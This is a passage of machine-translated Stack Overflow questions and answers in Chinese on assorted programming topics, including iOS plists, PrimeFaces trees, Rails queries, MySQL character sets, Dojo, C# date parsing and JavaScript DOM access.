            <string>www.google.com</string>
        </dict>
    </array>
    <array>
        <dict>
            <key>name</key>
            <string>England</string>
            <key>imagename</key>
            <string>england.png</string>
            <key>url</key>
            <string>www.google.com</string>
        </dict>
        <dict>
            <key>name</key>
            <string>France</string>
            <key>imagename</key>
            <string>france.png</string>
            <key>url</key>
            <string>www.google.com</string>
        </dict>
        <dict>
            <key>name</key>
            <string>Sweden</string>
            <key>imagename</key>
            <string>sweden.png</string>
            <key>url</key>
            <string>www.google.com</string>
        </dict>
        <dict>
            <key>name</key>
            <string>Ukraine</string>
            <key>imagename</key>
            <string>ukraine.png</string>
            <key>url</key>
            <string>www.google.com</string>
        </dict>
    </array>
    </array>
 </dict>
</plist> 
```

并且用于从此 plist 中读取的代码是

```
 NSArray *paths = NSSearchPathForDirectoriesInDomains (NSDocumentDirectory, NSUserDomainMask, YES);
// get documents path
NSString *documentsPath = [paths objectAtIndex:0];
// get the path to our Data/plist file
NSString *plistPath = [documentsPath stringByAppendingPathComponent:@"Data.plist"];

// check to see if Data.plist exists in documents
if (![[NSFileManager defaultManager] fileExistsAtPath:plistPath]) 
{
    // if not in documents, get property list from main bundle
    plistPath = [[NSBundle mainBundle] pathForResource:@"Data" ofType:@"plist"];
}

NSMutableDictionary *dict = [NSMutableDictionary alloc] initWithContentsOfFile:plistPath;
NSMutableArray *array = [dict objectForKey:@"Root"]; 
```

数组为空。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T08:52:29.460

您的 plist 包含一个字典，其中包含一个数组，该数组包含四个数组，而四个数组包含字典。

```
<plist version="1.0">
<dict>
<key>Root</key> 
```

这些行指定 plist 是字典而不是数组。

* * *

已编辑

```
NSMutableDictionary *dict = [NSMutableDictionary alloc] initWithContentsOfFile:plistPath;
NSMutableArray *array = [temp objectForKey:@"Root"]; 
```

你为什么在`temp`这里使用`dict`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T08:58:07.663

您缺少关闭`</dict>`和`</plist>`标签。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-15T09:48:54.457

你有没有试过这样编码：

```
NSString *path = [[NSBundle mainBundle] pathForResource:@”your_Plist_name” ofType:@”plist”];
NSMutableDictionary *saved = [[NSMutableDictionary alloc] initWithContentsOfFile: path]; 
NSArray *arr = [saved objectForKey:@"root"];

for(int i =0;i<4;i++)
{
  NSArray *next = [arr objectAtIndex:i];
    for(int j=0;j<4;j++)
    {
        NSDictionary *dict = [next objectAtIndex:j];

        NSString *value = [dict objectForKey:@"imagename"];
    }
} 
```

试试这个代码并检查它是否适合你..

# jsf - PrimeFaces Tree 组件，设置从托管 bean 中选择的节点

> ID：10597134
> 
> 赞同：16
> 
> 时间：2012-05-15T08:46:06.623
> 
> 标签：jsf, primefaces

我在 Glassfish 3 上运行 Primefaces 3.2 和 JSF 2.0。

我已经尝试了很多，以编程方式从托管 bean 设置选定的节点。这包括像这样设置选定的节点：

```
public void setSelectedTreeNode(String name) {
TreeNode root = treeBean.getRoot();
List<TreeNode> tree = root.getChildren();
for(TreeNode node:tree) {
  if(node.getData().toString().contains(name)) {
    System.out.println("found the node to select");
    treeBean.setSelectedNode(node);
    break;
  }
}
RequestContext context = RequestContext.getCurrentInstance(); 
context.update(":navForm:treeSingle");
} 
```

“找到要选择的节点”打印在终端中，但未在网页的树中选择该节点..

树是这样的：

```
<h:form id="navForm">
<p:tree id="treeSingle" value="#{treeBean.root}" var="node"  
       selectionMode="single" styleClass="treeStyle" 
       selection="#{treeBean.selectedNode}"
       cache="false"
       >  
   <p:ajax event="select" listener="#{treeBean.onNodeSelect}" update=":mainForm" />
   <p:treeNode>  
       <h:outputText value="#{node}" escape="false" />  
   </p:treeNode> 
```

编辑：TreeBean 是这样构建的：

```
@ManagedBean
@SessionScoped    
public class TreeBean implements Serializable {  

private TreeNode root;  

private TreeNode selectedNode;  

public TreeBean() {  
    root = new DefaultTreeNode("Root", null);  
    TreeNode node0 = new DefaultTreeNode("Node 0", root);  
    TreeNode node1 = new DefaultTreeNode("Node 1", root);  
    TreeNode node2 = new DefaultTreeNode("Node 2", root);  

    TreeNode node00 = new DefaultTreeNode("Node 0.0", node0);  
    TreeNode node01 = new DefaultTreeNode("Node 0.1", node0);  

    TreeNode node10 = new DefaultTreeNode("Node 1.0", node1);  
    TreeNode node11 = new DefaultTreeNode("Node 1.1", node1);  

    TreeNode node000 = new DefaultTreeNode("Node 0.0.0", node00);  
    TreeNode node001 = new DefaultTreeNode("Node 0.0.1", node00);  
    TreeNode node010 = new DefaultTreeNode("Node 0.1.0", node01);  

    TreeNode node100 = new DefaultTreeNode("Node 1.0.0", node10);  
}  

public TreeNode getRoot() {  
    return root;  
}  

public TreeNode getSelectedNode() {  
    return selectedNode;  
}  

public void setSelectedNode(TreeNode selectedNode) {  
    this.selectedNode = selectedNode;  
}  
} 
```

有谁知道如何做到这一点？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-06-10T13:29:07.897

我使用以下方法解决了它：

```
node.setSelected(true); 
```

我发现选择节点不足以让“树组件”从根节点扩展到选定节点。

为此，我使用了以下方法。在视图上：

```
 <p:ajax event="expand" listener="#{tree.onExpand}"/> 
```

在java代码上：

```
public void onExpand(NodeExpandEvent event) {
    expand(event.getTreeNode());
}

private void expand(TreeNode treeNode){
    if (treeNode.getParent()!=null){
        treeNode.getParent().setExpanded(true);
        expand(treeNode.getParent());
    }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-09-08T02:31:56.973

要从支持 bean 调用树小部件组件上的 selectNode() 方法突出显示客户端上选定的树节点。

首先，将 widget var 属性设置为 jsf 树组件：

```
<p:tree id="treeSingle" widgetVar="treeSingleWidget" 
```

比你可以从浏览器控制台测试它：

```
PrimeFaces.widgets.treeSingleWidget.selectNode($("#treeSingle\\:1"), true); 
```

第一个方法参数表示节点 jquery 对象，它是通过它的 id 获得的（冒号必须用两个反斜杠转义）。如果第二个参数设置为 false，则将触发节点选择事件。

最后，从支持 bean 进行 javascript 调用：

```
StringBuilder sb = new StringBuilder();
    sb.append("PrimeFaces.widgets.treeSingleWidget.selectNode(");
    sb.append("$(\"#treeSingle\\\\:");
    sb.append(selectedNode.getRowKey());
    sb.append("\")");
    sb.append(", true)");
    RequestContext.getCurrentInstance().execute(sb.toString()); 
```

PS 在浏览器控制台中发现组件 js api 类型

```
PrimeFaces.widget.VerticalTree.prototype 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2020-02-16T17:32:47.533

对我来说，以上都不起作用。因为从我在控制台中看到的内容来看，子节点没有任何 ID，更不用说任何行键编号，所以我在 rowKey 属性的帮助下使用了 jQuery 高级类选择器，所以我不得不使用

```
String script = "PF('treeSingleWidget').selectNode($(\"td[data-rowkey='" + selectedNode.getRowKey() + "']\"))";
Primefaces.current().executeScript(script); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-27T20:35:41.950

在上面的`if`陈述中，当为真时，做一个`node.setSelected(true);`

我用它来根据需要设置节点。反了明显有反作用；它会关闭它们。我的用例是一个布尔复选框，用于打开或关闭所有节点，因为我有很多节点在树的一侧运行。因此，我的实际代码，涉及一些方法，是：-

```
public Boolean getSelectionState() {
    return selectionState;
}

public void setSelectionState(Boolean selectionState) {
    this.selectionState = selectionState;
}

public String getSelectLabel() {
    return selectionState ? "De-select all" : "Select all";
}

/**
 * Flips all nodes on or off depending on checkbox.
 */
public void onSelectChange() {
    if (prefs.isDebug()) {
        LOG.log(Level.INFO, "Value change event occured. Selection state is:{0}", selectionState);
    }
    for (TreeNode node : rootNode.getChildren()) {
        node.setSelected(selectionState);
    }
    nodes = new ArrayList(rootNode.getChildren());
    selectedNodes = nodes.toArray(new TreeNode[nodes.size()]);
    mapDevices();
} 
```

但是，我在 GF 3 上的 JSF 2 上使用 3.4。我不知道是否有区别。

注册

蒂姆

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-04-05T14:31:12.703

请在`node.setSelected(true)`下面添加`treeBean.setSelectedNode(node);`，它应该可以工作。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-07-08T15:25:34.743

尝试使用 primefaces 5.2 和多选：

```
treeBean.setSelectedNode(new TreeNode[]{node}); 
```

作品。

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2015-10-12T09:09:08.543

我正在使用 Glassfish 3.1 Build 43 中部署的 Primefaces 3.0；

使用以下命令自动选择 treeNode：**myTreeNode.setSelected(true);**

**例子 ：**

```
 for (TreeNode m2:root.getChildren())   {

         if (((Menu) m2.getData()).getId() != null) {

            if (me.getId().equals(((Menu) m2.getData()).getId())) {

                                            m2.setSelected(true);
                                            break;
                                        }
                                    }
                                } 
```

# ruby-on-rails - issue in order 子句和活动记录中的限制

> ID：10597135
> 
> 赞同：2
> 
> 时间：2012-05-15T08:46:07.783
> 
> 标签：ruby-on-rails, ruby-on-rails-3, activerecord, sql-order-by

我正在触发此查询

```
p "my query starts here..."
@relevant_customers_for_total_spent = Customer.order("total_amount DESC").where('id IN (?)',@customers_ids).limit(relevant_customers_count_for_total_spent)

 p " -------  "
 p relevant_customers_count_for_total_spent  # output is: 1139
 p @relevant_customers_for_total_spent.count # output is: 2888
 p " -------  " 
```

更多日志是说实际触发的查询是：

```
SELECT COUNT(*) FROM `customers` WHERE (id IN (2,3,4,5,6,75,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,75,296,297,298,2889)) LIMIT 1139 
```

**所以问题是：**

1.  为什么实际查询中没有order子句？
2.  为什么@relevant_customers_for_total_spent.count 大于related_customers_count_for_total_spent。它应该等于或小于。

**更新-1 **

我得到了第二个问题：

```
@relevant_customers_for_total_spent.length 
```

是计算元素数量的正确方法。

**更新 - 2**

我在数组中有一些客户 ID，例如 [2,3,4,5,6,75,56,57,58,59,60,61,62]。我在 Customer 模型中有一个属性，即 total_amount。我想按照 total_amount (DESC) 的顺序重新排列所有客户 ID。我还有一个指定限制的因素，即我需要从该列表中获得多少客户。一些事情，如果它是 5。所以我需要根据 total_amount 来自那个 araay 的前 5 名客户。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T08:55:34.923

关键是：ARel 足够聪明，可以生成不带子句的`count`查询。`order`

想一想：`#count`relation 返回`select count(*) ...`SQL 查询，而后者又返回一个数字 - 为什么需要在这里订购的任何东西？

难怪`#length`返回正确的数字。这是因为`#length`被调用的关系对象不知道如何响应调用，触发自身从 DB 返回结果，该结果通常是数组的实例，然后将调用委托给它。因此，调用`#length`数组实例会返回预期的元素数量。

**更新**

```
ids = [1,2,3,4,5]

Customer.where(id: ids).order('total_amount DESC').limit(5) 
```

# filesystems - 如何计算 NTFS 磁盘的容量

> ID：10597137
> 
> 赞同：-1
> 
> 时间：2012-05-15T08:46:15.907
> 
> 标签：filesystems, ntfs

在 Linux 中，我创建了一个 2G 大小的文件作为虚拟磁盘并格式化为 NTFS，但它的大小不是 2G，正好少了 17170432 字节，对于 3G 文件，该值变为 13402112 字节。

我只知道 MBR 表有 512 字节，但其他呢？我如何知道从文件格式化的虚拟磁盘的确切卷？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T08:56:48.957

'我只知道 MBR 表有 512 字节，但其他呢？- 一大堆微软专有的 NTFS 日志文件系统元数据。

“我怎样才能知道从文件格式化的虚拟磁盘的确切卷？” 不知道——据我所知，没有人尝试过——“我猜大概是 2 场演出，所以我格式化了 5 场”。存储是如此便宜，以至于调整文件系统的大小不值得花任何时间。

# macos - 如何在 Mac OS X 中将应用程序注册到 uri 方案

> ID：10597144
> 
> 赞同：3
> 
> 时间：2012-05-15T08:46:47.473
> 
> 标签：macos, url, uri, url-scheme

[Mac OS 应用程序可以通过指定CFBundleURLTypes](https://developer.apple.com/library/mac/#documentation/General/Reference/InfoPlistKeyReference/Articles/CoreFoundationKeys.html#//apple_ref/doc/uid/TP40009249-SW1)通过其 Info.plist 文件注册自定义 uri 方案。为了添加另一个 uri 方案，需要修改应用程序包。

问题是：如何在不更改应用程序本身的情况下为已安装的应用程序添加额外的 uri 方案。如果可以从命令行完成，则可以加分。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-10T13:52:25.987

我个人使用[RCDefaultApp 首选项窗格](http://www.rubicode.com/Software/RCDefaultApp/ "RCDefaultApp 首选项窗格")，它是免费的。我认为它会为您管理这些 CFBundleURLTypes（以及更多）。

这是指向和点击。我也想听听命令行选项。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T03:32:13.997

[defaultapp](https://github.com/Grayson/defaultapp)是一个执行此操作的简单命令行工具。您需要自己下载并构建它。

然后，您可以使用类似`defaultapp ftp Transmit`将 Transmit 设置为 ftp 的默认应用程序的命令。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-11-04T16:30:56.637

您可以为此使用 LinCastor ( [http://onflapp.wordpress.com/lincastor/](http://onflapp.wordpress.com/lincastor/) )。可以将 URL 协议方案与 AppleScript、shell 脚本或现有应用程序相关联。

# android - 从广播接收器phonegap android调用插件功能

> ID：10597147
> 
> 赞同：3
> 
> 时间：2012-05-15T08:46:57.193
> 
> 标签：android, broadcastreceiver, phonegap-plugins

如何调用插件中的函数或从广播接收器初始化插件？

```
public void onReceive(Context context, Intent intent) {
   try {
      int st = intent.getIntExtra("state", -1);
      if (intent.getAction().equals(Intent.ACTION_HEADSET_PLUG)) {                      
         if(st==1)
         {
             //call from here
         }                      
      }
   } catch (Exception e) {
      e.printStackTrace();
   }
} 
```

# mysql - utf8 和 utf8_general_ci

> ID：10597153
> 
> 赞同：1
> 
> 时间：2012-05-15T08:47:32.493
> 
> 标签：mysql, character-encoding

我在向我的数据库插入行时遇到问题。当一行包含以下字符时：'è'、'ò'、'ò'、'€'、'²'、'³' .... 等...它会返回这样的错误（字符集设置为*utf8*） ：

```
Incorrect string value: '\xE8 pass...' for column 'descrizione' at row 1 - INSERT INTO materiali.listino (codice,costruttore,descrizione,famiglia) VALUES ('E 251-230','Abb','Relè passo passo','Relè'); 
```

但是，如果我将字符集设置为*latin1*或 *utf8_general_ci* 它工作正常，并且没有发现错误。

有人可以解释一下为什么会这样吗？我一直认为*utf8*比*latin1 “大”*

编辑：我也尝试使用 mysql_real_escape_string，但错误总是一样的！！！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-15T08:58:47.963

[`mysql_real_escape_string()`](http://dev.mysql.com/doc/en/mysql-real-escape-string.html)不相关，因为它只是转义了字符串终止引号，否则攻击者可以注入 SQL。

`utf8`确实比它“更大” `latin1`，因为它能够表示后者字符的超集。然而，并不是每个字节序列都代表有效`utf8`字符。而每个可能的字节序列都代表有效`latin1`字符。

因此，如果 MySQL 接收到它期望的字节序列`utf8`（但事实并非如此），某些字符很可能会触发这个“不正确的字符串值”错误；而如果它期望字节是`latin1`（即使它们不是），它们将被接受 - 但不正确的数据可能存储在表中。

您的问题几乎可以肯定是您的连接字符集与您的应用程序发送其字符串的编码不匹配。使用该`SET NAMES`语句更改当前连接的字符集，例如，`SET NAMES 'utf8'`如果您的应用程序正在发送编码为 UTF-8 的字符串。

阅读有关[连接字符集](http://dev.mysql.com/doc/en/charset-connection.html)的更多信息。

顺便说一句，`utf8_general_ci`不是字符集：它是字符集的排序*规则*`utf8`。[手册](http://dev.mysql.com/doc/en/charset-general.html)解释：

> ***字符集***是一组符号和编码。***排序***规则是一组用于比较字符集中的字符的规则。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-15T09:03:18.727

根据 UTF-8 的[文档](http://dev.mysql.com/doc/refman/5.0/en/charset-charsets.html)，默认排序规则是`utf8_general_ci`. 如果您想要字母表中的特定顺序不是那个顺序`general_ci`，您应该选择`utf8_*`为字符集提供的排序规则之一`utf8`，以符合您在排序方面的要求为准。

您的表和与数据库的连接都应该被编码`utf8`，最好是相同的排序规则，[阅读更多关于设置连接排序规则](http://dev.mysql.com/doc/refman/5.5/en/charset-connection.html)。

为了完全安全，您应该使用**SET NAMES的完整语法检查您的***表排序规则*并确保它是`utf8_*`并且您的连接也是

 **```
SET NAMES 'utf8' COLLATE 'utf8_general_ci' 
```

[您可以在此处](http://www.collation-charts.org/)找到有关不同排序规则的信息

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-10-15T02:06:14.777

```
mysql_query("SET NAMES 'utf8' COLLATE 'utf8_general_ci'"); 
```

尤里卡，上面做到了:-)**

# javascript - 使用这个的道场

> ID：10597154
> 
> 赞同：0
> 
> 时间：2012-05-15T08:47:34.373
> 
> 标签：javascript, dojo, this

你好我刚开始学习道场，我该如何使用`this`对象？我已经创建了类似下面的东西，但我认为它不正确

```
var node = dojo.query('.verticalslider')[0];
dojo.connect(node, "onclick", function(){
    var c = dojo.query(this).parent();
    console.log(c);
}) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T17:36:29.320

固定代码：

```
// eventlistener is setup on every DOM node with className 'verticalslider'  
dojo.query('.verticalslider').connect("click", function(){

    // this references the clicked DOM node
    var c = this.parentNode

    // parentNode of the clicked DOM node with class 'vertical..'
    console.log(c);
}) 
```

这更像是一个一般的 js 问题，然后它是一个道场，但对于 .connect 和 .on 函数，以下适用：

dojo.connect 是一个用于创建事件监听器的包装器。通常，如果您编写像 node.foo = function() {} 这样的代码，您只能拥有一个功能，因为等号会覆盖现有的功能。.connect 的标准行为是适用相同的范围，因此“this”引用我们正在侦听的对象。在这种情况下，“节点”。

`dj.connect(node, "foo", function() { this == node evaluates to true and arguments[0] == event });`

dojo.hitch (dojo/_base/lang) 是一个作用域附加助手。它适用于除超时/间隔挂钩之外的任何事件，并将强制传递给的函数对象，比如 .connect，在给定的范围内运行：dojo.hitch(scope, functor)。

`dj.connect(node, "bar", dj.hitch(dojo.doc(), function() { this == window.document evals true }));`

就 dojo.query 而言，它会返回一个 NodeList。列表不能有一个父级，因此您的 dojo.query(node).parent() 是错误的。.query 的正确用法是将选择器作为您的第一次使用传递。像这样：

```
dj.query(
  /* String */ "CSS Selector",
  /* Optional DOM node, defaults to body */ contextNode
)   // => dojo.NodeList 
```

见[NodeList 文档](http://dojotoolkit.org/reference-guide/1.7/dojo/NodeList.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-01-12T17:40:19.327

上面提到的代码是直接的方法，但是如果您需要在任何函数/回调中使用 this 的上下文，请使用 dojo.hitch (<1.7) 或 lang.hitch (1.7+)。它在函数内部传递 this 的上下文。

例如：

```
var myObj = {
  foo: "bar"
};
var func = dojo.hitch(myObj, function(){
  console.log(this.foo);
}); 
```

这里函数内部的 this 指的是对象 myObj 的上下文。

您的另一个固定代码可以是：

```
var node = dojo.query('.verticalslider')[0];
dojo.connect(node, "onclick", dojo.hitch(this,function(){
    var c = dojo.query(this).parent(); // here this will be having the outside context .
    console.log(c);
})) 
```

# php - 查询期间 JQuery Ajax 到 PHP 更新 div

> ID：10597162
> 
> 赞同：1
> 
> 时间：2012-05-15T08:47:58.720
> 
> 标签：php, jquery, ajax, progress

我正在从 CSV 文件中导入 4000 行。第 1 页显示带有 PROCESS 按钮的服务器上的 CSV 文件。 `Onclick`按钮，我使用**JQuery Ajax**调用执行导入的必要**PHP 代码**。在进行相关检查、更新记录和插入记录等操作后，整个导入过程大约需要 30 秒到 1 分钟。

我要做的是在处理 php 代码时显示此导入的进度。IE：

```
Total records to import: 4000
Total users imported: 20 [div id=usersImported - this number dynamically increments while importing]
Total users updated: 30 [div id=usersUpdated - same here re incrementing]
Etc.. 
```

我不确定正确的问题是什么，因为我尝试`DIVs (usersImported and usersUpdated)`从 php 代码更新 - 无法让它工作。这只是将我的脚本代码返回到浏览器，但实际上并没有执行它

我还尝试在更新或插入 php 后在 php 中进行回显。即：usersImported1 然后 usersImported2 然后 usersImported3 .. 然后在我的 JQuery 成功中我正在尝试：

`if( txt.match( "usersImported" ).length > 0 ) { ..`使用带有前导数字的更新 div innerHTML 代码..

这不起作用，因为 php 在处理时没有刷新，即使我已经尝试过`ob_flush();`，`flush();`或者是因为成功仅在整个 php 代码完成后才在 ajax 中运行？是否有 JQuery while: 命令？

所以我猜真正的问题是：这样做的正确方法是什么？从 PHP 更新 DIV 还是从基于 PHP 回声的 $ajax 更新 div？这类似于进度条更新，除了我想根据处理期间发生的情况更新某些 div。

我会很感激一个基本的例子或一个工作样本的链接。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T08:58:05.243

猜猜ajax不会触发，因为您没有关闭http，它会坐下来等待更多的到来。

您需要在服务器上流式传输或分块您的工作。

一个肮脏的修复方法是让更新程序将百分比写入静态公共文件，由客户端读取并继续轮询该文件。（添加一个随机查询字符串，以便获得通过缓存）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T09:01:09.627

没有任何直接的方法。您可以将 PHP 进程状态写入任何外部源，例如`file`or `database`，并在特定时间后在客户端读取该状态。

希望这篇文章能给你一个方向：

*   [冗长的 PHP 进程的进度条](http://spidgorny.blogspot.it/2012/02/progress-bar-for-lengthy-php-process.html)

# inheritance - 使用 PHP 和 Doctrine 2 有没有办法为检索到的数据实现自己的集合？

> ID：10597169
> 
> 赞同：2
> 
> 时间：2012-05-15T08:48:12.553
> 
> 标签：inheritance, collections, doctrine-orm

在实体中创建集合时，您将其初始化为`ArrayCollection`构造函数中的一个。`ArrayCollection`可以扩展并在它的地方使用那些孩子。但是，当从数据库中检索实体时，它会`ArrayCollection`被交换为`PersistentCollection`实现相同接口`ArrayCollection`但标记为 的`final`。

有没有一种方法可以实现您自己的集合类，当从数据库中检索数据时，您可以使用自定义集合方法对集合中的项目进行排序和检索。

PS 我不想修改 Doctrine 源代码本身。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-17T15:40:43.360

我所做的是修改我的公共 getCollection 方法。

```
private $collectionOfStuff; //this is a subclassed Doctrine\Common\Collections\ArrayCollection (MyCustomCollectionType in this case)

public function getCollectionOfStuff() {
   if (!$this->collectionOfStuff instanceof MyCustomCollectionType) {
        $this->collectionOfStuff = new MyCustomCollectionType($this->collectionOfStuff->toArray());
    }

    return $this->collectionOfStuff;
} 
```

之后你必须使用 $this->getCollectionOfStuff() 来发挥你的魔力。

这不是最好的解决方案（我本可以构建一个代理或某种类型的），但是由于学说还不支持对 ArrayCollection 进行子类化，因此对我来说这是最快/最简单的解决方案。

# c# - DateTime.Parse 或 Convert.ToDateTime 不起作用

> ID：10597170
> 
> 赞同：1
> 
> 时间：2012-05-15T08:48:15.717
> 
> 标签：c#, asp.net, asp.net-ajax, ajaxcontroltoolkit

我有一个带有日历扩展器的文本框。

格式应该是这样的：

```
<add key="DateFormat" value="dd/MM/yyyy"/> 
```

我的 aspx 标记上有以下内容

```
 <asp:TextBox ID="txt" runat="server" 
                        meta:resourcekey="txt" MaxLength="150" HtmlEncode="False"></asp:TextBox>
                        <ajaxToolkit:CalendarExtender runat="server"
                            TargetControlID="txt"
                                            PopupButtonID="Image1" Format="<%$Appsettings:DateFormat%>" /> 
```

当我尝试在这样的属性中使用它时：

```
datett= DateTime.Parse(txt.Text), 
```

它说 FormatException。

我调试并尝试了 Convert.ToDatetime，引发了同样的异常。

我正在测试的文本是 30/05/2015

根据我在 web.config 中的格式应该可以正常工作。

**update1** 我使用以下代码根据用户选择更改页面的语言和文化，也许这就是它失败的原因，

我看到很多答案，第二个问题是，如何获得当前的文化？

```
/// <summary>
        /// Handles the AcquireRequestState event of the Application control.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">The <see cref="System.EventArgs"/> instance containing the event data.</param>
        protected void Application_AcquireRequestState(object sender, EventArgs e)
        {
            //Create culture info object 
            /*var ci = new CultureInfo(Session["Language"].ToString());
            System.Threading.Thread.CurrentThread.CurrentUICulture = ci;
            System.Threading.Thread.CurrentThread.CurrentCulture = CultureInfo.CreateSpecificCulture(ci.Name);*/

            System.Web.UI.Page p = (System.Web.HttpContext.Current.Handler as System.Web.UI.Page);
            if (p != null)
            {
                p.UICulture = p.Culture = new CultureInfo((string)Session["Language"]).Name;
            }
        } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T08:51:07.243

您应该在解析时添加格式化程序。将 DateFormat 键添加到您的 web.config 不会自行执行任何操作。

```
VehicleDesctructionDate = DateTime.Parse(TxtVehicleDestructionDateReturnedVehicle.Text , /* put formatter here */,null); 
```

在所有情况下，最好使用 TryParse 来处理任何格式错误。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-15T08:53:57.230

您可以[`DateTime.ParseExact`](http://msdn.microsoft.com/en-us/library/w2sa9yss.aspx)明确地使用和/或传递文化：

```
var enCulture = new System.Globalization.CultureInfo("en-us");
DateTime result = DateTime.ParseExact("30/05/2015", 
                                      "dd/MM/yyyy", 
                                       enCulture ); 
```

**编辑**：如果您正在动态更改文化并将其存储在 Session 中，这应该有效：

```
var userCulture = new System.Globalization.CultureInfo((string)Session["Language"]);
DateTime result = DateTime.Parse(TxtVehicleDestructionDateReturnedVehicle.Text, userCulture ); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-15T08:57:01.443

解决方案是调整 IIS 上的文化属性，如果您在其上托管网站，或者如果您在本地工作，则在解析日期时应使用以下代码：

```
DateTime.Parse(date,new CultureInfo("en-GB",false)); 
```

如果这对您有用，您可以将此文化设置为母版页上的默认设置。

另一种解决方案是拆分日期文本并将每个拆分部分放入它的相应日期部分，例如对于这个日期“30/05/2015”：

```
 string x = "30/05/2015";
    DateTime dt = new DateTime(int.Parse(x.Split('/')[2]), int.Parse(x.Split('/')[1]), int.Parse(x.Split('/')[0])); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-15T09:03:50.093

尝试使用

```
Convert.ToDateTime(TxtVehicleDestructionDateReturnedVehicle.Text, CultureInfo.GetCultureInfo("en-GB")); 
```

或者

```
DateTime.Parse(TxtVehicleDestructionDateReturnedVehicle.Text , Appsettings.DateFormat,null); 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-05-15T08:53:45.047

```
Date date = new Date(location.getTime());
DateFormat dateFormat = android.text.format.DateFormat.getDateFormat(getApplicationContext());
mTimeText.setText("Time: " + dateFormat.format(date)) 
```

# javascript - Javascript Image对象重用引用变量，取消请求？

> ID：10597173
> 
> 赞同：1
> 
> 时间：2012-05-15T08:48:31.060
> 
> 标签：javascript, image, object

很难在这个上获得正确的标题。

如果我使用 Javascript 图像对象来跟踪某些东西，http 请求是异步完成的（它不是阻塞调用），所以我一直担心如果我重新使用引用图像对象的变量，我可能会强制取消请求。这里有一些代码可以说明我的担忧。

```
var img = new Image();
img.src = URL1;  //hit server with request 1
img = new Image(); //re-use the img variable for the next new Image
img.src = URL2;  //and now request 2\. Would this cancel request 1 ? 
```

我可以（并且目前确实）通过拥有一组 Image 对象来解决这个潜在的问题，然后我会采用下一个可用的对象，然后在 10 处环绕。**像**这样：

```
var imgs=[], index=0;
function send(url) {
    imgs[index] = new Image();
    imgs[index++].src = url;
    if(index>=10)index=0; //wraparound
}
send(URL1);
send(URL2); 
```

我知道在第一个代码示例中重新使用 img 对象时，我实际上并没有对那个原始图像对象做任何事情，我只是将它孤立起来——将它的引用计数减少到零并将它打开以进行垃圾收集。

我是否可能会发现（在第一个示例中）第一个请求被取消/中止？或者它会一直完成，只是发现完成后没有人感兴趣？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T08:57:22.623

你正在做正确的方式。如果您想知道您的请求是否已被取消，请为您的 firefox 安装 Firebug，然后打开 net request 选项卡并观察

# javascript - javascript获取段落的值以出现在textarea中

> ID：10597178
> 
> 赞同：0
> 
> 时间：2012-05-15T08:49:06.113
> 
> 标签：javascript

我正在尝试使用 javascript 将段落的值添加到文本区域。这是我目前的代码。我似乎无法让它工作。任何帮助表示赞赏

```
 <html>
  <head>
   </head>
  <body>
  <button value="this is a length definition" onclick="reveal(this.value)"> hi</button>
  <script type="text/javascript">
  function reveal(value)
  {
  var text = value;
  document.outputtext.value += value;
  }
  </script>
  <table>
  <tr>
  <td><textarea name="outputtext"></textarea></td>
  </tr></table>
  </body>
  </html> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T08:52:25.220

您的 textarea 不是文档的一部分。此外，您的按钮值不是段落。

*   给它一个 ID 并使用`document.getElementById("outputtext").value`（推荐）或
*   包装成一个表格并做`document.formName.outputtext.value`或
*   使用笨拙`document.getElementsByName("outputtext")[0].value`

这是使用 ID 的代码

[演示](http://jsfiddle.net/mplungjan/b6WrF/)

```
 <html>
  <head>
   </head>
  <body>
  <button value="this is a length definition" onclick="reveal(this.value)"> hi</button>
  <script type="text/javascript">
  function reveal(value) {
    document.getElementById("outputtext").value += value;
  }
  </script>
  <table>
  <tr>
  <td><textarea id="outputtext"></textarea></td>
  </tr></table>
  </body>
  </html> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-09-01T18:04:42.127

```
<html>
<head>
</head>
<body>
<button value="this is a length definition" onclick="reveal(this.value)"> hi</button>
<script type="text/javascript">
function reveal(value)
{
  var text = value;
  document.getElementById("outputtext").value += text;
}
</script>
<table>
  <tr>
    <td><textarea id="outputtext"></textarea></td>
  </tr></table>
</body>
</html> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-15T08:52:26.230

应该改为

```
<textarea id="outputtext"></textarea> 
```

然后代码更改为

```
document.getElementById('outputtext') 
```

祝你好运

您可以使用 name 但您必须调用 getElemntsByName() 并接收元素数组

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-15T09:02:37.397

代码更改为：

```
 <html>
 <head>
 </head>
<body>
<button value="this is a length definition" onclick="reveal(this.value);"> hi</button>
